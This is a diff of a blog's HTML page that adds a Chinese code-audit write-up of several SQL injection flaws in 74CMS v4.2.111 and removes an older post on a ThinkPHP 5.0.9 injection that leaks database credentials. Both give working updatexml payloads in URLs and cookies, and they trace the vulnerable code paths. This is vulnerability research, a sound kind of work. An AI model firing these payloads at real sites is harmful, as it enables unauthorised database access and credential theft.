@@ -236,6 +236,273 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/08/74CMS_V4.2.111多处sql注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/08/74CMS_V4.2.111多处sql注入/" itemprop="url">代码审计 | 74CMS_V4.2.111多处sql注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-08T09:15:41+08:00">
+                2018-10-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>漏洞的大致思路:</p>
+<pre><code>1.找到think_filter()漏掉的表达式match
+2.搜索用到where的参数可控的函数
+ a.get post cookie header等接收的参数
+ b.函数直接接收的参数 如  public function($id)
+3.用表达式构造sql语句
+</code></pre><hr>
+<p>##<strong>基础知识:</strong><br>总结一下在拿到一个基于TP框架开发的cms 审计流程是怎样的<br>这里以74cm最新版本<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_Home_Setup_v4.2.111</a>为例:<br>1.查看TP版本:</p>
+<pre><code>#upload\ThinkPHP\ThinkPHP.php
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/801cmnatics78bjp256lnu06/image_1cp969qp91hik13s31ua71t3a134e9.png" alt="image_1cp969qp91hik13s31ua71t3a134e9.png-23.6kB"><br>2.查看系统参数过滤情况:</p>
+<pre><code>#upload\applicaton\common\conf\config.php
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/mpakzoyvfnp4eecpbsgem1hg/image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png" alt="image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png-54.6kB"></p>
+<p><img src="http://static.zybuluo.com/chhyx/a036krjqziyp0q6fh9oikno5/image_1cp96prer19gn1n601jkuvocnje33.png" alt="image_1cp96prer19gn1n601jkuvocnje33.png-80.3kB"></p>
+<p>结果:使用I函数过滤的都会使用这三个函数进行过滤：</p>
+<pre><code>htmlspecialchars,stripslashes,strip_tags
+</code></pre><p>我们测试下基本的过滤规则:<br>在<code>upload\application</code>目录下新建<code>TestController.class.php</code>:</p>
+<pre><code>&lt;?php
+namespace Home\Controller;
+class TestController{
+
+function tt()
+{    
+    var_dump($_GET[&apos;id&apos;]);
+    var_dump(I(&apos;get.num&apos;,&apos;&apos;));
+}
+}
+</code></pre><p>访问:<code>http://127.0.0.1:84/index.php?m=Home&amp;c=Test&amp;a=tt&amp;id=2&#39;&quot;&lt;&gt;&amp;num=1&#39;&quot;&lt;&gt;</code><br>查看过滤信息 并未对单引号进行过滤<br><img src="http://static.zybuluo.com/chhyx/thfdp8xy6s1p42kn97offf37/image_1cp770ot51evk1n6h10fh1u2daa29.png" alt="image_1cp770ot51evk1n6h10fh1u2daa29.png-67.5kB"></p>
+<p>所有经过过滤的参数对value肯定是有过滤,但对key未进行过滤：<br><img src="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" alt="image_1cp773ng54rvi421e9og3g10okm.png-24.1kB"></p>
+<p>这里大概整理一下:<br>a.<code>_GET _POST _REQUEST _SERVER _FILES</code>系统无过滤<br>b.系统大部分使用的是<code>I</code>函数进行数据操作与过滤<br>c.调用<code>I</code>函数默认使用以下过滤规则:</p>
+<pre><code>a.将预定义字符`&amp; &quot; &apos; &lt; &gt;`转化为html实体 （单引号只有在设置ENT_QUOTES 才会转为实体）
+b.stripslashes() 函数删除由 addslashes() 函数添加的反斜杠
+c.strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签
+</code></pre><p>d.所有经过过滤的参数对value有过滤,但对key未进行过滤</p>
+<p>我们重点关注sql注入,可以知道并未对单引号进行过滤,所以我们可以</p>
+<pre><code>a.查找系统中拥有字符串拼接的地方
+b.查看是否有不使用I函数而带入数据库的 可进行框架注入
+</code></pre><p>3.如果有自带的get post cookie方法 查看其过滤规则</p>
+<p>更多基础知识请移步:<br><a href="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作</a></p>
+<p>##<strong>本地测试:</strong><br>1.开启debug+trace模式:<br>a.<code>upload\Application\Common\Conf\config.php</code>添加内容:</p>
+<pre><code>&apos;SHOW_PAGE_TRACE&apos;        =&gt;  true,
+</code></pre><p>b.在<code>upload\index.php</code>将<code>APP_DEBUG</code>设置为<code>true</code></p>
+<p>2.查看<code>I</code>函数的过滤情况:<br>这里的漏洞情况与笔者前几天分析的<a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">thinkphp5.0.10函数过滤不全导致一处盲注</a>思路类似,都是<code>I</code>函数用的过滤函数<code>think_filter()</code>过滤不全导致注入。</p>
+<p>think_filter():<br><img src="http://static.zybuluo.com/chhyx/kenyd6ju23x35t1zpnnkcver/image_1cp99h5raa7dr6hebthgk19388i.png" alt="image_1cp99h5raa7dr6hebthgk19388i.png-21.4kB"></p>
+<p>系统自带的表达式:<br><img src="http://static.zybuluo.com/chhyx/2rm44f6cgdjpupj9xft5k245/image_1cp99k0aj19jngo1vtt1sc51cffa2.png" alt="image_1cp99k0aj19jngo1vtt1sc51cffa2.png-17.6kB"></p>
+<p>这里漏掉了多个表达式<br>eq,is,is not,match,match_mode,match_with</p>
+<p>这里我们选取match进行利用,我们查看match相关的操作代码:</p>
+<p><img src="http://static.zybuluo.com/chhyx/sphmu2yx9iwyhfergt9m7q2d/48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png" alt="48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png-16.8kB"></p>
+<p>要想构造sql注入,需要闭合前面的双引号,但是文章开头我们说了I函数的过滤规则是过滤双引号的,这时候我们就需要寻找一处不经过I函数的或不过滤双引号的地方来构造漏洞。</p>
+<p>测试代码:</p>
+<pre><code>#Application\Home\Controller\IndexController.class.php
+public function index($id){//直接接收的参数$id不经过I函数过滤
+M(&apos;test_user&apos;)-&gt;field(&apos;id,name&apos;)-&gt;where(array(&apos;id&apos; =&gt; $id))-&gt;find();
+        echo M(&apos;test_user&apos;)-&gt;getLastSql();
+</code></pre><p>payload:</p>
+<pre><code>http://127.0.0.1:84/index.php?m=home&amp;c=index&amp;a=index&amp;id[0]=match&amp;id[1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0)-- a
+</code></pre><p>利用:<br><img src="http://static.zybuluo.com/chhyx/4wga2ajqcvsn9itkplwlmcfn/image_1cp97gkt7g831hsb60ahpiigo3g.png" alt="image_1cp97gkt7g831hsb60ahpiigo3g.png-90.9kB"></p>
+<p>##<strong>漏洞利用:</strong><br>在74cms中寻找形如寻找形如<code>M()-&gt;where($id)--&gt;xx</code>,只要where中参数可控且不会过滤双引号即可。<br>我们在编辑器内搜索相关代码调试,得到4处可利用的点。</p>
+<p>1.<code>upload\Application\Home\Controller\AjaxPersonalController.class.php</code><br><code>$company_id</code> 函数直接接收的参数,不受过滤规则的约束,可控且无过滤</p>
+<pre><code>#AjaxPersonalController.class.php 137行
+public function company_focus($company_id){
+    if(!$company_id){
+        $this-&gt;ajaxReturn(0,&apos;请选择企业！&apos;);
+    }
+    $r = D(&apos;PersonalFocusCompany&apos;)-&gt;add_focus($company_id,C(&apos;visitor.uid&apos;));
+    $this-&gt;ajaxReturn($r[&apos;state&apos;],$r[&apos;msg&apos;],$r[&apos;data&apos;]);
+}
+</code></pre><p>跟进add_focus()函数:<br><img src="http://static.zybuluo.com/chhyx/9hfa3dlxobcwng3xz5r7kkn0/image_1cp8q661n1lqaeh516sebh1bqp2p.png" alt="image_1cp8q661n1lqaeh516sebh1bqp2p.png-68.2kB"></p>
+<p><img src="http://static.zybuluo.com/chhyx/605l40sydht50z29duok12zn/image_1cp8qpd2bf871bsa10431083p54d3.png" alt="image_1cp8qpd2bf871bsa10431083p54d3.png-310.8kB"></p>
+<p>2.<code>upload\Application\Home\Controller\CompanyServiceController.class.php</code></p>
+<pre><code>$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
+</code></pre><p><code>$order_id</code>函数直接接收的参数 不受过滤规则的约束<br>可控且无过滤</p>
+<pre><code>public function order_pay_finish($order_id){
+$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
+    ...
+}
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/vogy2h9r4ttmtfm44urvgnfy/image_1cp8qjt291cs21urq1ohr1onmjivat.png" alt="image_1cp8qjt291cs21urq1ohr1onmjivat.png-91.4kB"></p>
+<p>3.<code>upload\Application\Home\Controller\MembersController.class.php</code></p>
+<pre><code>#MembersController.class.php 220行
+public function register(){
+        ...
+        if(IS_POST &amp;&amp; IS_AJAX){
+            $data[&apos;reg_type&apos;] = I(&apos;post.reg_type&apos;,0,&apos;intval&apos;);//注册方式(1:手机，2:邮箱，3:微信)
+            $array = array(1 =&gt; &apos;mobile&apos;,2 =&gt; &apos;email&apos;);
+            $data[&apos;utype&apos;] = I(&apos;post.utype&apos;,0,&apos;intval&apos;);
+
+            if($data[&apos;reg_type&apos;] == 1){//进入
+                $data[&apos;mobile&apos;] = I(&apos;post.mobile&apos;,0,&apos;trim&apos;);//注意
+                 //判断验证码
+            ...
+
+            if(&apos;bind&apos; == $ucenter = I(&apos;post.ucenter&apos;,&apos;&apos;,&apos;trim&apos;)){
+                $uc_user = cookie(&apos;members_uc_info&apos;);
+                $data = array_merge($data,$uc_user);//合并数组
+
+                $passwordVerify = $data[&apos;password&apos;];
+            }
+            ...
+            // 若手机号重复且勾选了解绑原帐号
+            if($data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2){
+                $data[&apos;unbind_mobile&apos;] = I(&apos;post.unbind_mobile&apos;,0,&apos;intval&apos;);
+                if($data[&apos;unbind_mobile&apos;]){
+                    $repeat = M(&apos;Members&apos;)-&gt;where(array(&apos;mobile&apos;=&gt;$data[&apos;mobile&apos;]))-&gt;select();//漏洞触发点
+</code></pre><p>漏洞利用条件:</p>
+<pre><code>a.IS_POST &amp;&amp; IS_AJAX
+b.bind&apos; == $ucenter
+c.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2
+d.$data[&apos;unbind_mobile&apos;] 存在
+</code></pre><p>这里的漏洞参数$data[‘mobile’] 是可控的<br>虽然$data[‘mobile’]是I函数取值的,但是在下面<code>$data = array_merge($data,$uc_user);</code> 对cookie接收的参数进行了合并,这样我们就可以利用cookie方式来传递我们的sql语句来进行注入</p>
+<p>payload分析:</p>
+<pre><code>url:http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
+POST：ucenter=bind&amp;utype=2&amp;reg_type=1&amp;unbind_mobile=1 //满足bcd
+headers:Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest         //满足AJAX操作
+
+Cookie: members_uc_info[mobile][0]=match; members_uc_info[mobile][16][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a //注入利用
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/lxggkw9182tcrh3fb46vh5rb/image_1cp8u762a1mms1buc1l2bc851a4deg.png" alt="image_1cp8u762a1mms1buc1l2bc851a4deg.png-93.2kB"></p>
+<p>本地测试时,如无短信服务,我们可以注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/02de6ocyv7r4dhob382abr8l/image_1cp8ufiq5u431rsd1p1a3j11sjjet.png" alt="image_1cp8ufiq5u431rsd1p1a3j11sjjet.png-75.4kB"></p>
+<p>4.<code>upload\Application\Home\Controller\membercontroller.class.php</code></p>
+<pre><code>public function oauth_reg(){
+
+        if (cookie(&apos;members_bind_info&apos;)) {
+
+            $user_bind_info = object_to_array(cookie(&apos;members_bind_info&apos;));
+
+        }else{
+            $this-&gt;error(&apos;第三方授权失败，请重新操作！&apos;);
+        }
+        //第三方帐号绑定
+        $username = I(&apos;post.username&apos;,&apos;&apos;,&apos;trim&apos;);
+        $password = I(&apos;post.password&apos;,&apos;&apos;,&apos;trim&apos;);
+        $passport = $this-&gt;_user_server();
+        ...
+    }
+
+        else{//进入
+            $user = $passport-&gt;_user;//获取个人信息
+            ...//uid不可控 所以这里不可利用
+        }
+        ...
+        $info = M(&apos;MembersBind&apos;)-&gt;where(array(&apos;type&apos;=&gt;$user_bind_info[&apos;type&apos;],&apos;uid&apos;=&gt;$uid))-&gt;find();//触发点
+</code></pre><p>payload:</p>
+<pre><code>header：Content-Type: application/x-www-form-urlencoded
+       //表明提交的表单数据编码为键值对,用&amp;分隔
+
+Cookie: members_bind_info[type][0]=match; members_bind_info[type][19][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
+
+POST: username=test1&amp;password=test1  //注册账户 用户名:test1       密码:test1
+</code></pre><p>这里的$user_bind_info是用cookie方式直接传过来的 我们可控导致注入产生:<br><img src="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png" alt="image_1cp903p10259b6p17d011omemhfa.png-92.9kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2119,358 +2386,6 @@ try {
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入/" itemprop="url">代码审计 | ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-19T08:15:41+08:00">
-                2018-09-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<p><strong>1.基础知识</strong><br>A.Thinkphp的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/42wg1fal3zdlypt0yqnx10qj/image_1cnoln6a46g715koj3o6rcpbhm.png" alt="image_1cnoln6a46g715koj3o6rcpbhm.png-71.9kB"><br>更多基础知识可参考文章：<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a><br><strong>2.环境搭建</strong><br>A.</p>
-<pre><code>#application\index\controller\Index.php
-&lt;?php
-namespace app\index\controller;
-use app\model\Gather;
-use think\Db;
-
-class Index
-{    
-    public function test()
-    {
-        $ids = input(&quot;id/a&quot;);
-        $gather = new Gather();
-        $gather-&gt;update([&apos;gather_waf&apos; =&gt; &apos;thinkphp&apos;],[&apos;id&apos; =&gt; [&apos;in&apos;,$ids]]);
-    }
-}
-?&gt;
-</code></pre><p>B.</p>
-<pre><code>#application\model\Gather.php
-&lt;?php
-namespace app\model;
-use think\Model;
-use think\Db;
-
-class Gather extends Model {
-    public function getModel(){
-        $rs = Db::query(&apos;show columns FROM user&apos;);
-        $a = [];
-        if($rs){
-            foreach ($rs as $key =&gt; $v) {
-                $a[$v[&apos;Field&apos;]] = $v[&apos;Default&apos;];
-                if($v[&apos;key&apos;] == &apos;PRI&apos;){
-                    $v[&apos;Field&apos;] = 0;
-                }    
-            }
-    }    return $a;        
-    }
-}    
-
-?&gt;
-</code></pre><p>C.<br> 数据库下新建表gather表下新建字段gather_waf、id</p>
-<p><strong>3.漏洞利用</strong><br>payload：<br><code>127.0.0.1:82/public/index.php/index/index/test?id[0,updatexml(0,concat(0xa,user()),0)]=1</code></p>
-<p><img src="http://static.zybuluo.com/chhyx/0zcysigiatdabqegxix5iwhj/image_1cnoariv0mgh17d11mfk1k52t0036.png" alt="image_1cnoariv0mgh17d11mfk1k52t0036.png-64.9kB"></p>
-<p><strong>4.代码审计</strong><br>相关变量已经在注释中<br>A.从index.php开始，</p>
-<pre><code>$gather-&gt;update([&apos;gather_waf&apos; =&gt; &apos;thinkphp&apos;],[&apos;id&apos; =&gt; [&apos;in&apos;,$ids]]);
-</code></pre><p>B.跟进model.php的update()方法:<br>1448行:</p>
-<pre><code>#thinkphp\library\think\Model.php
-$result = $model-&gt;isUpdate(true)-&gt;save($data, $where);
-</code></pre><p>跟进save()方法<br>1002行:</p>
-<pre><code>#thinkphp\library\think\Model.php
-public function save($data = [], $where = [], $sequence = null)
-{
-    if (!empty($data)) {
-        // 数据自动验证
-        if (!$this-&gt;validateData($data)) {
-            return false;
-        }
-        // 数据对象赋值
-        foreach ($data as $key =&gt; $value) {
-            $this-&gt;setAttr($key, $value, $data);
-        }
-    }
-    ...
-    $pk = $this-&gt;getPk();//$pk:NULL
-    if ($this-&gt;isUpdate) {//$this-&gt;isUpdate:true
-    ...
-        // 模型更新
-        //$this-&gt;getQuery()://think\db\Query::$where
-        $result =                
-        $this-&gt;getQuery()-&gt;where($where)-&gt;update($data);
-
-        ...
-}
-</code></pre><p>其中:            </p>
-<pre><code>$result = $this-&gt;getQuery()-&gt;where($where)-&gt;update($data);
-</code></pre><p>C.跟进query.php的update()方法</p>
-<pre><code>#thinkphp\library\think\db\Query.php
-public function update(array $data = [])
-{   
-    ...
-    //where不为空
-    ...
-    // 生成UPDATE SQL语句
-    $sql = $this-&gt;builder-&gt;update($data, $options);
-    // 获取参数绑定
-    $bind = $this-&gt;getBind();
-    ... 
-    else {
-        // 检测缓存
-        if (isset($key) &amp;&amp; Cache::get($key)) {
-            // 删除缓存
-            Cache::rm($key);
-        } elseif (!empty($options[&apos;cache&apos;][&apos;tag&apos;])) {
-            Cache::clear($options[&apos;cache&apos;][&apos;tag&apos;]);
-        }
-        // 执行操作
-        //$sql:UPDATE `gather` SET `gather_waf`=:__data__gather_waf WHERE `id` IN (:where_id_in_00000&apos;)
-        $result = &apos;&apos; == $sql ? 0 : $this-&gt;execute($sql, $bind);
-
-        ...
-        return $result;
-    }
-}
-</code></pre><p>其中:</p>
-<pre><code>$sql = $this-&gt;builder-&gt;update($data, $options);
-</code></pre><p>D.跟进<code>thinkphp\library\think\db\Builder.php</code>的<code>update()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/u6zwd3bbanwd7vefq952id1a/image_1cno7um1g11q71p2213001b9psbf1p.png" alt="image_1cno7um1g11q71p2213001b9psbf1p.png-71.8kB"><br>其中:</p>
-<pre><code>$this-&gt;parseWhere($options[&apos;where&apos;], $options),
-</code></pre><p>跟进<code>parseWhere()</code>方法:</p>
-<pre><code>#thinkphp\library\think\db\Builder.php
-protected function parseWhere($where, $options)
-{   
-    $whereStr = $this-&gt;buildWhere($where, $options);
-    //$whereStr:`id` IN (:where_id_in_00000&apos;)
-    ...
-    return empty($whereStr) ? &apos;&apos; : &apos; WHERE &apos; . $whereStr;
-
-}
-</code></pre><p>其中:</p>
-<pre><code>$whereStr = $this-&gt;buildWhere($where, $options);
-</code></pre><p>跟进<code>buildWhere()</code>方法:</p>
-<pre><code>public function buildWhere($where, $options)
-{   
-    ...
-
-    $whereStr = &apos;&apos;;
-    //$options[&apos;table&apos;]:gather
-    $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
-    foreach ($where as $key =&gt; $val) {
-        $str = [];
-        foreach ($val as $field =&gt; $value) {
-            ....
-            else {
-                // 对字段使用表达式查询
-                $field = is_string($field) ? $field : &apos;&apos;;
-                $str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
-            }
-        }
-        $whereStr .= empty($whereStr) ? substr(implode(&apos; &apos;, $str), strlen($key) + 1) : implode(&apos; &apos;, $str);
-    }
-
-    return $whereStr;
-}
-</code></pre><p>其中:</p>
-<pre><code>$str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
-</code></pre><p>跟进<code>parseWhereItem()</code>方法:</p>
-<pre><code>protected function parseWhereItem($field, $val, $rule = &apos;&apos;, $options = [], $binds = [], $bindName = null)
-{   
-    //$field:id   $val:[0=&gt;&apos;in&apos;,1=&gt;{[&quot;00000&apos;&quot;]=&gt; &quot;1&apos;&quot;}]
-    $key = $field ? $this-&gt;parseKey($field, $options) : &apos;&apos;;
-    //$key:`id`
-
-    ...
-
-    list($exp, $value) = $val;
-    //$exp:in   $value: [&quot;00000&apos;&quot;]=&gt; &quot;1&apos;&quot;
-
-    ...
-
-    // 检测操作符
-    if (!in_array($exp, $this-&gt;exp)) {//进入
-        $exp = strtolower($exp);
-        if (isset($this-&gt;exp[$exp])) {
-            $exp = $this-&gt;exp[$exp];//$exp:IN
-        } else {
-            throw new Exception(&apos;where express error:&apos; . $exp);
-        }
-    }
-    ...
-    $whereStr = &apos;&apos;;
-    ...
-</code></pre><p>这里得到的<code>$exp</code>的值为<code>IN</code>,我们看下与in有关的操作代码:</p>
-<pre><code>if (preg_match(&apos;/\W/&apos;, $bindName)) {
-// 处理带非单词字符的字段名
-$bindName = md5($bindName);
-}
-...
-elseif (in_array($exp, [&apos;NOT IN&apos;, &apos;IN&apos;])) {//进入
-   // IN 查询
-   if ($value instanceof \Closure) {
-       $whereStr .= $key . &apos; &apos; . $exp . &apos; &apos; . $this-&gt;parseClosure($value);
-   } else {//进入
-       $value = is_array($value) ? $value : explode(&apos;,&apos;, $value);
-       if (array_key_exists($field, $binds)) {
-           $bind  = [];
-           $array = [];
-           //$value:[&quot;00000&apos;&quot;]=&gt; &quot;1&apos;&quot;
-           foreach ($value as $k =&gt; $v) {
-               if ($this-&gt;query-&gt;isBind($bindName . &apos;_in_&apos; . $k)) {//判断这个bindname不存在
-                   $bindKey = $bindName . &apos;_in_&apos; . uniqid() . &apos;_&apos; . $k;
-               } else {//进入
-                   $bindKey = $bindName . &apos;_in_&apos; . $k;
-               }
-               $bind[$bindKey] = [$v, $bindType];
-               $array[]        = &apos;:&apos; . $bindKey;
-           }
-           //$bind:[&quot;where_id_in_00000&apos;&quot;]=&gt;{ [0]=&gt; &quot;1&apos;&quot; [1]=&gt; int(2) } 
-           $this-&gt;query-&gt;bind($bind);
-           $zone = implode(&apos;,&apos;, $array);
-       } else {
-           $zone = implode(&apos;,&apos;, $this-&gt;parseValue($value, $field));
-       }
-       $whereStr .= $key . &apos; &apos; . $exp . &apos; (&apos; . (empty($zone) ? &quot;&apos;&apos;&quot; : $zone) . &apos;)&apos;;
-       //$whereStr：`id` IN (:where_id_in_00000&apos;)
-   }
-        }
-</code></pre><p>E.这里就是形成漏洞的<strong>关键</strong>处:虽然<code>$bindName</code>在进入绑定操作前进行了<code>preg_match()</code>检测,但是在<code>$value</code>为数组的情况下程序就会遍历数组<code>$value</code>并将键组<code>$k</code>直接拼接到<code>$bindName</code>,而<code>$k</code>并没有进行安全处理,所以导致了在预编译的时候SQL异常,tp框架在5.0.9又默认开启debug调试模式 所以爆出数据库连接账户和密码</p>
-<p>这里我们理一下文件及跟进的函数</p>
-<pre><code>Model.php(update)--&gt;Model.php(save)---&gt;query.php(update)--&gt;Builder.php(update)--&gt;Builder.php(parseWhere)--&gt;Builder.php(buildWhere)--&gt;Builder.php(parseWhereItem)  得到$sql语句
-</code></pre><p>然后sql语句回溯<br><code>Builder.php(buildWhere)--&gt;Builder.php(parseWhere)--&gt;Builder.php(update)--query.php(update)</code></p>
-<p>在quert.php的update()方法,执行execute时报错</p>
-<pre><code>$result = &apos;&apos; == $sql ? 0 : $this-&gt;execute($sql, $bind);
-</code></pre><p>我们跟进execute()方法看一下:</p>
-<pre><code>#thinkphp\library\think\db\Connection.php
-...
-if (empty($this-&gt;PDOStatement)) {
-$this-&gt;PDOStatement = $this-&gt;linkID-&gt;prepare($sql);
-</code></pre><p>经过上下文的<code>die()</code>测试,发现程序是在用<code>prepare()</code>编译时报错</p>
-<p>F.按照文章中笔者的说法,这里并不存在sql注入,但是经过查阅相关资料及P师傅的博客,发现这里其实是一个不允许子查询的sql注入</p>
-<p><strong>鸡肋sql注入:</strong><br>在上面的分析中 我们知道<code>$k</code>也就是<code>$bindName</code>是我们可以控制的,说明我们可控制预编译的sql语句,但是这里为什么说是一个不允许子查询的sql注入呢。<br>这里涉及到PDO预编译的三个步骤:</p>
-<pre><code>1.prepare($sql)    编译SQL语句
-2.bindParam($a,$b)  绑定 PHP 变量到参数标记
-3.execute()    执行sql语句
-</code></pre><p>这里也涉及到一个<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>预处理参数的配置<br>直接引用P师傅的话:</p>
-<blockquote>
-<p>这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行；如果我这里设置了PDO::ATTR_EMULATE_PREPARES<br>=&gt; false，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。</p>
-<p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p>
-</blockquote>
-<p>默认的Thinkphp配置：<br><img src="http://static.zybuluo.com/chhyx/g0wkga74rhoc97bjywwbbe38/image_1cnol50m31iepu3usdb8epq99.png" alt="image_1cnol50m31iepu3usdb8epq99.png-21.5kB"></p>
-<p>那么,假设在第一步执行prepare($SQL)的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步，这就是执行我们sql语句的关键<br>访问:</p>
-<pre><code>127.0.0.1:82/public/index.php/index/index/test?id[0,updatexml(0,concat(0xa,user()),0)]=1
-</code></pre><p>即可成功获得user()信息:<br><img src="http://static.zybuluo.com/chhyx/0zcysigiatdabqegxix5iwhj/image_1cnoariv0mgh17d11mfk1k52t0036.png" alt="image_1cnoariv0mgh17d11mfk1k52t0036.png-64.9kB"></p>
-<p>但是id数组的键并不能为子查询语句 只能用一些数据库函数来注入,由于笔者并不擅长sql注入,等有时间回来再试试。<br><strong>5.参考链接</strong><br>1.<a href="http://www.runoob.com/php/pdo-prepare.html" target="_blank" rel="noopener">http://www.runoob.com/php/pdo-prepare.html</a><br>2.<a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener">https://xz.aliyun.com/t/125</a><br>3.<a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a><br>4.<a href="https://www.kancloud.cn/manual/thinkphp5/135187" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/135187</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2521,7 +2436,7 @@ $this-&gt;PDOStatement = $this-&gt;linkID-&gt;prepare($sql);
               
